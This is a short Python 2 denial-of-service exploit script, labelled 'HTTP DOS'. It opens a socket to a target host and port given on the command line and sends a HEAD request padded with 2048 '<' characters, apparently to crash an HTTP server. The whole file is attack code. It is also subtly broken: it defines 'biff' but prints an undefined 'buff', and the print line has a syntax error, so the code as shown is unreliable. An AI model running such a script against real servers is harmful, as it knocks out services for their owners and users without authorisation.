#!/usr/bin/python
# HTTP DOS
# Discovered and coded by Satya Enki


import socket
import os
import sys
from time import sleep

biff="<"*2048
print   '\r\n Payload sent \r\n' str(len(buff))
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect ( ( sys.argv[1], 8028 ) )
expl.send ( 'HEAD '+biff+' HTTP/1.1\r\nHost: 192.168.1.10:20\r\nUser-Agent: Mozilla/4.0 (Linux 2.6.21.5) Java/1.5.0_02\r\n\r\n')
data=expl.recv(1024)
print data
expl.close()